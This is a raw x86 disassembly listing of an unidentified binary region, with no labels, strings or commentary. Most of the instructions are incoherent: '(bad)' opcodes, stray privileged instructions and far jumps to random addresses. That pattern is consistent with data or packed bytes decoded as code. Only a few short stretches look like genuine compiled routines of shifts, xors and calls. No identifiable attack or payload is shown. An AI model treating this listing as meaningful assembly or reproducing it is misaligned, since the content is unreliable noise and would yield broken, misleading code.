  412a4c:	cmp    al,0x64
  412a4e:	mov    edx,DWORD PTR [edi+0x64]
  412a51:	daa    
  412a52:	mov    ds:0x5aa301a7,al
  412a57:	xchg   esp,eax
  412a58:	xchg   ecx,eax
  412a59:	mov    bh,0xd6
  412a5b:	ss and al,0xa5
  412a5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a5f:	mov    edi,0x2c7aa502
  412a64:	pushf  
  412a65:	aad    0xc
  412a67:	cwde   
  412a68:	adc    esi,DWORD PTR [edi]
  412a6a:	push   es
  412a6b:	xor    esp,esp
  412a6d:	pop    edx
  412a6e:	mov    ch,0x9e
  412a70:	xchg   ecx,esi
  412a72:	and    ecx,DWORD PTR [ecx]
  412a74:	pop    esp
  412a75:	push   eax
  412a76:	pusha  
  412a77:	mov    al,ds:0x5b1a9a54
  412a7c:	push   esp
  412a7d:	or     dh,BYTE PTR [edx]
  412a7f:	jp     0x412ada
  412a81:	shl    DWORD PTR [ecx+0x1a],1
  412a84:	popf   
  412a85:	cmp    DWORD PTR [edi-0xad24b4],esi
  412a8b:	mov    bh,0x35
  412a8d:	jmp    0x412ac4
  412a8f:	iret   
  412a90:	mov    ch,0xa2
  412a92:	jo     0x412a64
  412a94:	and    ch,BYTE PTR [edx+edi*8+0x56]
  412a98:	xor    bl,al
  412a9a:	cli    
  412a9b:	jmp    0xb53b3171
  412aa0:	mov    ah,BYTE PTR [esi]
  412aa2:	sbb    al,0xf8
  412aa4:	idiv   DWORD PTR [edi-0x14]
  412aa7:	pop    ebp
  412aa8:	clc    
  412aa9:	mov    ds:0xc0968a0e,al
  412aae:	lahf   
  412aaf:	push   0xffffffef
  412ab1:	cmc    
  412ab2:	adc    eax,0xd366104f
  412ab7:	pop    ds
  412ab8:	add    eax,0xaed661a4
  412abd:	dec    esi
  412abe:	popa   
  412abf:	jmp    0x3b67ce95
  412ac4:	inc    ecx
  412ac5:	mov    ah,0x35
  412ac7:	stc    
  412ac8:	loopne 0x412a87
  412aca:	hlt    
  412acb:	pop    DWORD PTR [edx+ebp*8+0x5f25fc48]
  412ad2:	repz mov ecx,0xc9c22807
  412ad8:	lods   al,BYTE PTR ds:[esi]
  412ad9:	jp     0x412ade
  412adb:	and    eax,0x8c3fcae2
  412ae0:	and    eax,0x5daeeff9
  412ae5:	xor    BYTE PTR [eax],ah
  412ae7:	sbb    cl,bh
  412ae9:	scas   eax,DWORD PTR es:[edi]
  412aea:	or     DWORD PTR [ebp+0x7a4db3f0],0xfffffff1
  412af1:	test   DWORD PTR [ebx+0x7e],0x3fd168f6
  412af8:	inc    esi
  412af9:	mov    ds:0x5138176e,al
  412afe:	es pop edi
  412b00:	daa    
  412b01:	mov    dh,0xdc
  412b03:	je     0x412b49
  412b05:	test   eax,0xfcec6d0b
  412b0a:	cs mov ebx,0xf25b76f7
  412b10:	sbb    al,0x7
  412b12:	pop    esp
  412b13:	imul   esi,DWORD PTR [ebx],0x683b7a45
  412b19:	xor    ah,bl
  412b1b:	inc    edx
  412b1c:	hlt    
  412b1d:	jmp    0x9084:0x71be8f09
  412b24:	enter  0x915d,0x30
  412b28:	stos   BYTE PTR es:[edi],al
  412b29:	pushf  
  412b2a:	icebp  
  412b2b:	xchg   esp,eax
  412b2c:	loope  0x412b5f
  412b2e:	mov    dl,0x33
  412b30:	xchg   edx,eax
  412b31:	pop    ecx
  412b32:	adc    bl,bl
  412b34:	xor    BYTE PTR [ecx+0x1f],ah
  412b37:	aad    0x3d
  412b39:	dec    esp
  412b3a:	mov    BYTE PTR [edi-0x4],dh
  412b3d:	test   DWORD PTR [edx+0x31b2e1e6],esi
  412b43:	cmp    esp,DWORD PTR [ebp-0x5ba3a0b7]
  412b49:	repnz sub BYTE PTR [eax+0x70],bh
  412b4d:	dec    edx
  412b4e:	push   ebx
  412b4f:	jle    0x412aea
  412b51:	mov    cl,0x7f
  412b53:	(bad)  
  412b54:	scas   eax,DWORD PTR es:[edi]
  412b55:	xchg   BYTE PTR [edx-0x45],dh
  412b58:	xor    al,0x65
  412b5a:	inc    ebx
  412b5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b5c:	mov    ds:0x6b386e06,eax
  412b61:	fadd   st,st(6)
  412b63:	push   edx
  412b64:	popa   
  412b65:	push   esp
  412b66:	ins    BYTE PTR es:[edi],dx
  412b67:	sti    
  412b68:	push   eax
  412b69:	pop    ebp
  412b6a:	std    
  412b6b:	mov    dh,0x69
  412b6d:	xor    eax,0x22e486aa
  412b72:	cwde   
  412b73:	jbe    0x412b3b
  412b75:	mov    dh,0x5e
  412b77:	(bad)  
  412b78:	push   esi
  412b79:	dec    ebx
  412b7a:	fidiv  WORD PTR [esi+0x68a1eaad]
  412b80:	imul   esp,esp,0x6754fe82
  412b86:	lahf   
  412b87:	(bad)  
  412b88:	(bad)  [ebx+0x219ef01d]
  412b8e:	daa    
  412b8f:	sub    DWORD PTR [ebx-0x720c52c],eax
  412b95:	paddd  mm1,QWORD PTR [eax+0x71]
  412b99:	xor    al,0x1e
  412b9b:	push   ecx
  412b9c:	or     al,BYTE PTR [ecx]
  412b9e:	add    DWORD PTR [edx-0xe8a9f94],eax
  412ba4:	xchg   edi,eax
  412ba5:	sbb    esp,0x84423f1
  412bab:	push   edx
  412bac:	into   
  412bad:	jge    0x412c0a
  412baf:	dec    edx
  412bb0:	pop    edx
  412bb1:	jo     0x412bf5
  412bb3:	lods   eax,DWORD PTR ds:[esi]
  412bb4:	mov    edx,0xf57e7ee1
  412bb9:	shl    esp,0x2
  412bbc:	in     al,0x1f
  412bbe:	les    ecx,FWORD PTR [ebp+0x758c4e09]
  412bc4:	shl    DWORD PTR [edx-0x61],1
  412bc7:	mov    cl,0xae
  412bc9:	jno    0x412b88
  412bcb:	int    0xe8
  412bcd:	leave  
  412bce:	repnz push esp
  412bd0:	inc    ebp
  412bd1:	mov    edx,0x5802be15
  412bd6:	mov    ch,0xb
  412bd9:	inc    esp
  412bda:	jo     0x412c08
  412bdc:	stos   DWORD PTR es:[edi],eax
  412bdd:	inc    esi
  412bde:	std    
  412bdf:	xor    eax,0x9ee73627
  412be4:	adc    ebx,ebx
  412be6:	enter  0x613b,0xe0
  412bea:	sbb    esi,DWORD PTR [eax+0x31bb974b]
  412bf0:	dec    ebp
  412bf1:	mov    eax,ds:0xb341a129
  412bf6:	pop    ds
  412bf7:	jl     0x412bb6
  412bf9:	scas   al,BYTE PTR es:[edi]
  412bfa:	sahf   
  412bfb:	rcl    DWORD PTR [esi+0x5cab37db],1
  412c01:	and    eax,0xe6e1ff3c
  412c06:	div    DWORD PTR [esi-0x1f]
  412c09:	je     0x412c27
  412c0b:	rol    bh,1
  412c0d:	daa    
  412c0e:	mov    ds:0x3c21bd99,eax
  412c13:	cmp    eax,0x211fa387
  412c18:	jmp    0x412be3
  412c1a:	and    DWORD PTR [esi+0x4b929e5d],ecx
  412c20:	shl    DWORD PTR [ebx-0x55],1
  412c23:	imul   ebx,DWORD PTR [edx],0x5a46772f
  412c29:	or     al,0xe8
  412c2b:	push   esp
  412c2c:	in     eax,0x33
  412c2e:	stos   DWORD PTR es:[edi],eax
  412c2f:	test   ebp,0xd6b6d2d5
  412c35:	pop    ebx
  412c36:	jns    0x412bde
  412c38:	add    dh,BYTE PTR [edx]
  412c3a:	pusha  
  412c3b:	mov    ds:0xe08effb0,al
  412c40:	pushf  
  412c41:	iret   
  412c42:	sub    edx,DWORD PTR [ebx+0x3af30a5d]
  412c48:	pop    ebp
  412c49:	btr    DWORD PTR [ebp+0x393d0940],eax
  412c50:	enter  0x6ea8,0x38
  412c54:	add    bl,BYTE PTR [ecx]
  412c56:	push   ebx
  412c57:	inc    ecx
  412c58:	mov    bh,0x48
  412c5a:	and    BYTE PTR [edi],ah
  412c5c:	mov    esp,0x6700c1a0
  412c61:	ret    0x5fe1
  412c64:	out    dx,eax
  412c65:	je     0x412c42
  412c67:	clc    
  412c68:	push   ds
  412c69:	xchg   ebp,eax
  412c6a:	(bad)  
  412c6b:	sub    esi,DWORD PTR [ecx-0x75]
  412c6e:	inc    ebp
  412c6f:	clc    
  412c70:	mov    ecx,DWORD PTR [ebp-0x4]
  412c73:	mov    edx,DWORD PTR [ebp-0x10]
  412c76:	mov    edi,DWORD PTR [ebp-0xc]
  412c79:	add    eax,edx
  412c7b:	mov    edx,DWORD PTR [ebp-0x18]
  412c7e:	adc    ecx,edi
  412c80:	mov    edi,DWORD PTR [ebp-0x14]
  412c83:	push   edi
  412c84:	push   edx
  412c85:	or     ecx,0x6833
  412c8b:	or     eax,0x6b80
  412c90:	jmp    0x413068
  412c95:	cmp    eax,0x5aa05c23
  412c9a:	sahf   
  412c9b:	cmp    eax,0xec8af322
  412ca0:	mov    esi,0xaae99a2b
  412ca5:	inc    ecx
  412ca6:	push   eax
  412ca7:	sbb    BYTE PTR [eax],bl
  412ca9:	stos   BYTE PTR es:[edi],al
  412caa:	adc    bl,BYTE PTR [eax]
  412cac:	sbb    BYTE PTR [ecx],bh
  412cae:	push   ebx
  412caf:	push   ecx
  412cb0:	sub    ebx,esi
  412cb2:	inc    edx
  412cb3:	jmp    0x412d06
  412cb5:	aaa    
  412cb6:	lahf   
  412cb7:	sbb    bl,BYTE PTR [ebx-0x18854001]
  412cbd:	add    edi,edx
  412cbf:	arpl   WORD PTR [edx+0x2b],si
  412cc2:	pop    esp
  412cc3:	popf   
  412cc4:	cld    
  412cc5:	addr16 mov bl,0x86
  412cc8:	push   0xc387628e
  412ccd:	lock ficomp DWORD PTR [esi]
  412cd0:	jmp    0x412d3f
  412cd2:	cmp    eax,0x202f7bfc
  412cd7:	not    DWORD PTR [ecx-0x30bb141f]
  412cdd:	sar    DWORD PTR [ebx+0x71fc0c43],cl
  412ce3:	sub    DWORD PTR [edi+eax*4+0x62],edi
  412ce7:	enter  0x66fd,0x29
  412ceb:	inc    edi
  412cec:	pop    esp
  412ced:	jbe    0x412c86
  412cef:	mov    al,0xd4
  412cf1:	cwde   
  412cf2:	add    eax,0xab52ea82
  412cf7:	pop    ebp
  412cf8:	dec    ecx
  412cf9:	int    0x44
  412cfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412cfc:	enter  0x5aa2,0xb3
  412d00:	test   ecx,eax
  412d02:	icebp  
  412d03:	cli    
  412d04:	xchg   esp,eax
  412d05:	int3   
  412d06:	cmc    
  412d07:	sub    bl,BYTE PTR [ebp+0x2308cd6b]
  412d0d:	fs retf 
  412d0f:	push   ecx
  412d10:	xor    BYTE PTR [ebp-0x58],al
  412d13:	pop    ss
  412d14:	inc    ebp
  412d15:	fmul   QWORD PTR [ebp+0x10dfc5d0]
  412d1b:	aam    0x9a
  412d1d:	cmp    eax,0x413d8aa0
  412d22:	ror    ecx,0xde
  412d25:	push   edi
  412d26:	pop    eax
  412d27:	cmp    DWORD PTR [ecx-0x5039ca5c],ebp
  412d2d:	data16 out dx,al
  412d2f:	pop    eax
  412d30:	iret   
  412d31:	ja     0x412cc0
  412d33:	loope  0x412d42
  412d35:	jge    0x412daa
  412d37:	jbe    0x412d9e
  412d39:	outs   dx,BYTE PTR ds:[esi]
  412d3a:	outs   dx,BYTE PTR ds:[esi]
  412d3b:	test   DWORD PTR [ebx],ecx
  412d3d:	je     0x412ce6
  412d3f:	shl    BYTE PTR [edx+0x7e533f50],1
  412d45:	dec    esp
  412d46:	add    al,BYTE PTR [ebx]
  412d48:	or     al,0x9c
  412d4a:	sub    DWORD PTR [esp+ecx*8+0x1],ecx
  412d4e:	and    eax,0x132976b
  412d53:	gs pop es
  412d55:	cmc    
  412d56:	sub    BYTE PTR [esi+0x4f],al
  412d59:	dec    ebp
  412d5a:	and    eax,ecx
  412d5c:	retf   
  412d5d:	inc    esi
  412d5e:	jg     0x412d1d
  412d60:	sti    
  412d61:	or     eax,0xcdf812c0
  412d67:	push   ecx
  412d68:	sub    ebp,edx
  412d6a:	lods   eax,DWORD PTR ds:[esi]
  412d6b:	mov    ds:0xe5e1f646,eax
  412d70:	pop    ebp
  412d71:	xor    eax,0x19ae6ae6
  412d76:	xchg   ebx,eax
  412d77:	cmp    DWORD PTR [esi-0x3e],ebp
  412d7a:	xchg   ebp,eax
  412d7b:	inc    edi
  412d7c:	cmp    DWORD PTR [edi],ebx
  412d7e:	and    eax,0x6ffadaa1
  412d83:	xchg   ebp,eax
  412d84:	pop    eax
  412d85:	call   0xa6a3:0xc9d8ce82
  412d8c:	test   DWORD PTR [edx+ebp*4],ebx
  412d8f:	jne    0x412d85
  412d91:	xor    eax,0xe30bb7d3
  412d96:	add    ecx,DWORD PTR [ebx]
  412d98:	xor    esp,DWORD PTR [ecx]
  412d9a:	rol    esp,cl
  412d9c:	push   edx
  412d9d:	or     DWORD PTR [ebp+eax*1-0x501f6a0],esi
  412da4:	jmp    0xc7f4813e
  412da9:	add    DWORD PTR [edx+0x1404534e],ebx
  412daf:	test   BYTE PTR [ecx+0x5f],al
  412db2:	jl     0x412d98
  412db4:	cmp    ecx,0x27
  412db7:	jmp    0x3edd:0xf24d2c49
  412dbe:	mov    ch,0x18
  412dc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412dc1:	jmp    0xa6cb:0xfae5ede8
  412dc8:	push   esp
  412dc9:	sub    al,bh
  412dcb:	(bad)  
  412dcc:	and    eax,0x87788efc
  412dd1:	jo     0x412e39
  412dd3:	scas   al,BYTE PTR es:[edi]
  412dd4:	push   es
  412dd5:	cmp    al,0x91
  412dd7:	fiadd  WORD PTR [ecx+0x10]
  412dda:	push   ecx
  412ddb:	jmp    0x2e6c0e45
  412de0:	imul   BYTE PTR [edx+0x73]
  412de3:	cmp    eax,0x7e5d23d4
  412de8:	inc    ecx
  412de9:	or     eax,0xb91ee780
  412dee:	adc    eax,0xaf827f85
  412df3:	mov    eax,0x85808f86
  412df8:	imul   ebx,DWORD PTR [edi+eiz*1-0x1f],0xec9b0c3b
  412e00:	shr    BYTE PTR [ebx],1
  412e02:	sbb    BYTE PTR [eax-0x6],bh
  412e05:	gs pop es
  412e07:	rcl    BYTE PTR [esp+esi*1-0x2afb26b4],cl
  412e0e:	cmp    al,0xf9
  412e10:	jecxz  0x412dcc
  412e12:	int    0xda
  412e14:	and    DWORD PTR [ecx],ebx
  412e16:	mov    al,ds:0x74bb7041
  412e1b:	jb     0x412de8
  412e1d:	and    eax,0x2a26548a
  412e22:	loopne 0x412e19
  412e24:	push   es
  412e25:	pop    ss
  412e26:	xchg   ebp,eax
  412e27:	jge    0x412e5a
  412e29:	fsubr  st,st(3)
  412e2b:	pop    ds
  412e2c:	jno    0x412e03
  412e2e:	jmp    0xc55:0x89c72b10
  412e35:	mov    edi,esp
  412e37:	jmp    0x8f40feed
  412e3c:	ret    0x25f8
  412e3f:	jl     0x412e27
  412e41:	fst    DWORD PTR [edi+0x39a09451]
  412e47:	xchg   ecx,eax
  412e48:	test   al,0x7
  412e4a:	mov    ebp,0x961fcc78
  412e4f:	xchg   ecx,eax
  412e50:	ficom  DWORD PTR [ecx-0x58]
  412e53:	lea    ebx,[edi+0x7]
  412e56:	in     al,dx
  412e57:	sahf   
  412e58:	jno    0x412e75
  412e5a:	cmp    ebp,ebp
  412e5c:	ror    BYTE PTR [ebx-0xa98696a],1
  412e62:	xor    BYTE PTR cs:[edx-0x133d9d39],0xb8
  412e6a:	jno    0x412ebb
  412e6c:	xor    DWORD PTR ds:0x28b36a39,0xa60201f3
  412e76:	mov    bl,0x86
  412e78:	cmp    ebp,DWORD PTR [eax-0x3e]
  412e7b:	xchg   esp,ebp
  412e7d:	mov    eax,0x88d90c08
  412e82:	aas    
  412e83:	(bad)  
  412e84:	ja     0x412ee8
  412e86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e87:	retf   0xc38b
  412e8a:	(bad)
  412e8d:	lea    edi,[edx]
  412e8f:	cs nop
  412e91:	adc    al,0x30
  412e93:	retf   0xa35c
  412e96:	aas    
  412e97:	mov    WORD PTR [eax+0x72285a71],es
  412e9d:	inc    ecx
  412e9e:	das    
  412e9f:	dec    ebp
  412ea0:	mov    bh,0x1
  412ea2:	jl     0x412ebb
  412ea4:	retf   0x2e94
  412ea7:	lock fdiv DWORD PTR [ecx-0x741b132f]
  412eae:	mov    ch,0x82
  412eb0:	push   esp
  412eb1:	xchg   esp,eax
  412eb2:	fld    DWORD PTR [ecx-0x3a]
  412eb5:	aam    0xdb
  412eb7:	jmp    0x2fa:0x36b778de
  412ebe:	ins    BYTE PTR es:[edi],dx
  412ebf:	xor    al,0xd7
  412ec1:	mov    dl,0x3c
  412ec3:	outs   dx,BYTE PTR ds:[esi]
  412ec4:	not    BYTE PTR [ecx]
  412ec6:	pop    ebx
  412ec7:	and    esp,DWORD PTR [ecx]
  412ec9:	mov    eax,ds:0x88ee8f70
  412ece:	jb     0x412f09
  412ed0:	dec    ebp
  412ed1:	xor    ch,BYTE PTR [eax-0x706467c0]
  412ed7:	mov    edx,0xa7a4af13
  412edc:	or     BYTE PTR [ebp-0x5b],dl
  412edf:	adc    edi,ecx
  412ee1:	sti    
  412ee2:	dec    eax
  412ee3:	mov    ebx,0xc4a1be31
  412ee8:	fld    TBYTE PTR [esi]
  412eea:	fxtract 
  412eec:	inc    esp
  412eed:	xlat   BYTE PTR ds:[ebx]
  412eee:	retf   
  412eef:	fbld   TBYTE PTR [edx-0x2b]
  412ef2:	sbb    BYTE PTR fs:[ecx+0x56],al
  412ef6:	fnstcw WORD PTR [ecx+0x520e5129]
  412efc:	cwde   
  412efd:	addr16 xchg esi,eax
  412eff:	mov    bh,0x14
  412f01:	xchg   bh,al
  412f03:	cld    
  412f04:	adc    edi,DWORD PTR [edi+eiz*1+0x78fab4f7]
  412f0b:	inc    esi
  412f0c:	pop    esp
  412f0d:	or     eax,0x946d0065
  412f12:	cwde   
  412f13:	lods   al,BYTE PTR ds:[si]
  412f15:	aad    0x9b
  412f17:	mov    ecx,0x5f07c14b
  412f1c:	cli    
  412f1d:	bound  esp,QWORD PTR [ebp+edx*1-0x275ef5cc]
  412f24:	mov    ah,0x53
  412f26:	add    ah,dh
  412f28:	jae    0x412eb7
  412f2a:	cmp    eax,0xe2d369a
  412f2f:	dec    esp
  412f30:	or     edi,eax
  412f32:	inc    ebp
  412f33:	fst    QWORD PTR [edi]
  412f35:	test   eax,0x4904ad4e
  412f3a:	pop    edi
  412f3b:	dec    edx
  412f3c:	ficom  DWORD PTR [ebp+0x5b469b4d]
  412f42:	sbb    esi,DWORD PTR [edi+ebp*8-0x4d]
  412f46:	inc    ecx
  412f47:	test   BYTE PTR [ebx-0x33],al
  412f4a:	push   esp
  412f4b:	jecxz  0x412fa9
  412f4d:	test   al,0x32
  412f4f:	jmp    0x51744225
  412f54:	ins    BYTE PTR es:[edi],dx
  412f55:	mov    al,0x9d
  412f57:	aaa    
  412f58:	jg     0x412f2e
  412f5a:	test   DWORD PTR [esi+ecx*4],0xfe26cd48
  412f61:	daa    
  412f62:	ret    0xb6b3
  412f65:	int    0xdb
  412f67:	pop    ebp
  412f68:	out    0xa9,eax
  412f6a:	or     esi,DWORD PTR [eax-0x7d3a3337]
  412f70:	popa   
  412f71:	mov    edi,0x2722036c
  412f76:	stos   BYTE PTR es:[edi],al
  412f77:	bound  ecx,QWORD PTR ss:[eax]
  412f7a:	in     eax,0x2f
  412f7c:	lahf   
  412f7d:	push   ss
  412f7e:	(bad)  
  412f7f:	cmp    eax,0xaddc61cc
  412f84:	mov    ah,BYTE PTR [ecx-0x598135b0]
  412f8a:	sbb    esp,esp
  412f8c:	daa    
  412f8d:	sbb    ebp,DWORD PTR [ebp-0x258cd576]
  412f93:	test   al,0xf8
  412f95:	(bad)  
  412f96:	pop    esp
  412f97:	(bad)  
  412f98:	(bad)
  412f9c:	xor    BYTE PTR [edx+0x31dc00ec],bl
  412fa2:	iret   
  412fa3:	xor    BYTE PTR [esi],bh
  412fa5:	stos   DWORD PTR es:[edi],eax
  412fa6:	adc    al,0xde
  412fa8:	loop   0x412f87
  412faa:	sub    BYTE PTR [esi+0x2b],al
  412fad:	das    
  412fae:	adc    DWORD PTR [esi],ecx
  412fb0:	xchg   edx,eax
  412fb1:	clc    
  412fb2:	aaa    
  412fb3:	jle    0x412f53
  412fb5:	jns    0x412fe5
  412fb7:	sub    DWORD PTR ds:0x93e35782,esi
  412fbd:	and    BYTE PTR [esi-0x1ccf8a38],0x30
  412fc4:	fcmovu st,st(4)
  412fc6:	xchg   ebx,eax
  412fc7:	xor    eax,0xcc71608
  412fcc:	jb     0x412fc3
  412fce:	sub    al,0xf8
  412fd0:	or     esp,DWORD PTR [eax+0x51]
  412fd3:	ret    
  412fd4:	dec    edx
  412fd5:	push   es
  412fd6:	adc    al,ah
  412fd8:	stos   BYTE PTR es:[edi],al
  412fd9:	loop   0x412fca
  412fdb:	jae    0x413047
  412fdd:	leave  
  412fde:	mov    DWORD PTR [ecx+0x6d379351],edi
  412fe4:	mov    ecx,0x17e8f8ae
  412fe9:	ds add al,0x52
  412fec:	fisub  WORD PTR ds:0xf57184cd
  412ff2:	popf   
  412ff3:	or     ebp,DWORD PTR [edi+0x7a]
  412ff6:	mov    ebx,DWORD PTR [edx-0x49]
  412ff9:	sub    eax,0x3f67afed
  412ffe:	inc    edi
  412fff:	dec    eax
  413000:	jns    0x412ff6
  413002:	jg     0x413025
  413004:	add    DWORD PTR [edx+edi*1+0xf],edi
  413008:	fmul   DWORD PTR [eax+0x605b599b]
  41300e:	xlat   BYTE PTR ds:[ebx]
  41300f:	mov    ebp,0x8cf1ff88
  413014:	push   ds
  413015:	push   0x7b1e19fd
  41301a:	cli    
  41301b:	scas   al,BYTE PTR es:[edi]
  41301c:	pop    edi
  41301d:	out    0x24,eax
  41301f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413020:	clc    
  413021:	push   cs
  413022:	dec    edi
  413023:	cmp    ebp,edx
  413025:	and    al,0x42
  413027:	test   eax,0xb7f26c67
  41302c:	mov    DWORD PTR [edi+0x73],esi
  41302f:	inc    esi
  413030:	sub    DWORD PTR [ebp-0x2c],ebp
  413033:	or     BYTE PTR [ecx+0x18],ah
  413036:	add    ah,BYTE PTR [edi+edi*8]
  413039:	mov    ebx,0x38b84465
  41303e:	daa    
  41303f:	je     0x413086
  413041:	push   ss
  413042:	dec    esi
  413043:	adc    DWORD PTR [esi+0x711e28f5],ebx
  413049:	dec    esi
  41304a:	xor    esi,DWORD PTR [edx]
  41304c:	fnstenv [ecx+0x574646a7]
  413052:	sbb    eax,0xd5399ea6
  413057:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413058:	loop   0x413078
  41305a:	mov    edi,0x90fba672
  41305f:	adc    eax,DWORD PTR [edx+0x4f44965c]
  413065:	imul   edx,DWORD PTR es:[edx+0x51],0x50
  41306a:	call   0x4220c5
  41306f:	mov    ecx,DWORD PTR [ebp-0x20]
  413072:	mov    edi,DWORD PTR [ebp-0x1c]
  413075:	and    eax,0x25cb
  41307a:	or     eax,ecx
  41307c:	mov    ecx,DWORD PTR [ebp-0x20]
  41307f:	mov    ecx,DWORD PTR [ebp-0x1c]
  413082:	and    edx,0x76f2
  413088:	or     edx,edi
  41308a:	xor    edx,esi
  41308c:	xor    eax,0x253b
  413091:	shld   edx,eax,0x2
  413095:	shl    eax,0x2
  413098:	shr    ecx,0x1e
  41309b:	xor    esi,esi
  41309d:	or     eax,ecx
  41309f:	or     edx,esi
  4130a1:	xor    eax,0xca79a575
  4130a6:	mov    DWORD PTR [ebp-0x20],eax
  4130a9:	mov    esi,0x9c1b89e8
  4130ae:	xor    edx,esi
  4130b0:	mov    DWORD PTR [ebp-0x1c],edx
  4130b3:	mov    eax,DWORD PTR [ebp-0x38]
  4130b6:	mov    ecx,DWORD PTR [ebp-0x34]
  4130b9:	mov    edx,DWORD PTR [ebp-0x40]
  4130bc:	mov    edi,DWORD PTR [ebp-0x3c]
  4130bf:	push   edi
  4130c0:	push   edx
  4130c1:	push   ecx
  4130c2:	push   eax
  4130c3:	call   0x416c20
  4130c8:	add    eax,0x536a
  4130cd:	jmp    0x4134a5
  4130d2:	push   edx
  4130d3:	(bad)  
  4130d4:	push   ebx
  4130d5:	jbe    0x41312a
  4130d7:	jb     0x41310b
  4130d9:	mov    dl,0xf6
  4130db:	push   eax
  4130dc:	xchg   DWORD PTR [edx+esi*8+0xd],edi
  4130e0:	pop    ds
  4130e1:	jle    0x4130b6
  4130e3:	dec    eax
  4130e4:	sbb    BYTE PTR [eax],bl
  4130e6:	stos   BYTE PTR es:[edi],al
  4130e7:	adc    bl,BYTE PTR [eax]
  4130e9:	sbb    BYTE PTR [esi+0xd],dl
  4130ec:	cmp    bh,dh
  4130ee:	enter  0x75a1,0x88
  4130f2:	pop    ecx
  4130f3:	clc    
  4130f4:	(bad)  
  4130f5:	xchg   edi,eax
  4130f6:	in     al,dx
  4130f7:	fcmove st,st(4)
  4130f9:	mov    al,0x37
  4130fb:	(bad)  
  4130fc:	loope  0x4130d9
  4130fe:	fdiv   DWORD PTR [ebp+0x4]
  413101:	and    DWORD PTR [esp+edx*8+0x47b7d722],0xed5653e
  41310c:	mov    ds:0xf7d42420,al
  413111:	jno    0x413106
  413113:	jbe    0x413159
  413115:	jg     0x413135
  413117:	lock jge 0x41310f
  41311a:	mov    ds:0x594e9b20,eax
  41311f:	leave  
  413120:	sbb    al,0xca
  413122:	ds ret 0xf8ac
  413126:	sbb    ebp,DWORD PTR [esi+0x7834e2b]
  41312c:	or     DWORD PTR [esi-0x2e],0xcb9a9004
  413133:	aad    0xce
  413135:	jle    0x413154
  413137:	pop    es
  413138:	cmp    al,cl
  41313a:	mov    esp,0x82858061
  41313f:	ds push esp
  413141:	cmp    DWORD PTR ds:0x5a12b4e1,edi
  413147:	data16 cmp al,0xd8
  41314a:	xchg   ebp,eax
  41314b:	popa   
  41314c:	mov    ds:0x45810dda,al
  413151:	lods   al,BYTE PTR ds:[esi]
  413152:	mov    al,ds:0x3b02e5a9
  413157:	xchg   edx,edx
  413159:	fisttp DWORD PTR [ebp+0x158d797]
  41315f:	cdq    
  413160:	enter  0xaa34,0xa7
  413164:	ret    0x2f0a
  413167:	dec    ecx
  413168:	ror    BYTE PTR [edi+0x68eedbc3],1
  41316e:	fdiv   st(0),st
  413170:	fsubr  QWORD PTR [edx-0x74f7507c]
  413176:	(bad)  
  413177:	mov    ah,0xd2
  413179:	inc    edi
  41317a:	inc    ecx
  41317b:	push   ds
  41317c:	ins    DWORD PTR es:[edi],dx
  41317d:	inc    ebx
  41317e:	sub    eax,0x5abe15c5
  413183:	(bad)  
  413184:	hlt    
  413185:	icebp  
  413186:	add    ebp,DWORD PTR [esp+ebx*8-0x29]
  41318a:	push   ecx
  41318b:	aad    0xb0
  41318d:	pop    edx
  41318e:	cmc    
  41318f:	sbb    eax,edi
  413191:	xlat   BYTE PTR ds:[ebx]
  413192:	stos   BYTE PTR es:[edi],al
  413193:	sbb    BYTE PTR [eax+edx*4],0xe3
  413197:	mov    ch,0x86
  413199:	mov    bh,0x8d
  41319b:	ror    DWORD PTR [ebx+0x4e],cl
  41319e:	push   esp
  41319f:	(bad)  
  4131a0:	or     cl,BYTE PTR [esi+eax*1-0x2f]
  4131a4:	jge    0x4131e0
  4131a6:	int3   
  4131a7:	push   es
  4131a8:	loope  0x413208
  4131aa:	mov    eax,ds:0x84282633
  4131af:	enter  0x6997,0x8f
  4131b3:	out    0xdd,eax
  4131b5:	add    DWORD PTR [eax+0x6b],edx
  4131b8:	pop    ebp
  4131b9:	mov    ds:0x83fc106f,eax
  4131be:	and    al,BYTE PTR [ecx]
  4131c0:	ds (bad) 
  4131c3:	addr16 jae 0x413163
  4131c6:	cmp    cl,BYTE PTR [ebp+0x42]
  4131c9:	pop    ecx
  4131ca:	jle    0x413229
  4131cc:	mov    cl,0x51
  4131ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131cf:	arpl   WORD PTR [ecx+ebp*4-0x4e],si
  4131d3:	mov    ch,0xf0
  4131d5:	adc    edx,DWORD PTR [ecx-0x6e]
  4131d8:	inc    ecx
  4131d9:	push   esp
  4131da:	div    BYTE PTR [ebp+0x394e745f]
  4131e0:	mov    edi,eax
  4131e2:	xchg   edi,eax
  4131e3:	ret    0xb8f8
  4131e6:	ins    BYTE PTR es:[edi],dx
  4131e7:	sub    esp,edx
  4131e9:	out    dx,eax
  4131ea:	xor    dh,ah
  4131ec:	mov    cl,BYTE PTR [ecx]
  4131ee:	sbb    esp,DWORD PTR [ecx-0x68e9605]
  4131f4:	sar    BYTE PTR [edx],cl
  4131f6:	add    al,BYTE PTR [edx]
  4131f8:	sbb    DWORD PTR [esi],0x37
  4131fb:	lahf   
  4131fc:	jle    0x413252
  4131fe:	ror    BYTE PTR [edi-0x48],cl
  413201:	out    dx,al
  413202:	imul   esi,ebp,0x39e4c489
  413208:	dec    edx
  413209:	pop    edi
  41320a:	mov    ah,0x5c
  41320c:	stos   DWORD PTR es:[edi],eax
  41320d:	push   ecx
  41320e:	adc    dh,BYTE PTR fs:[ebp+0x5d]
  413212:	gs and eax,0xb1d81831
  413218:	mov    esp,0xc5a273fa
  41321d:	mov    ebx,0xe635d81b
  413222:	xor    eax,DWORD PTR ds:0x54b06a35
  413228:	or     DWORD PTR [ebp+0x1b],ebp
  41322b:	pop    esp
  41322c:	leave  
  41322d:	inc    ebx
  41322e:	addps  xmm0,xmm3
  413231:	xchg   ecx,eax
  413232:	xor    ebx,esi
  413234:	sbb    al,BYTE PTR [eax+0x2c]
  413237:	sub    BYTE PTR [esi],cl
  413239:	xor    al,0x61
  41323b:	jbe    0x4131d8
  41323d:	in     al,dx
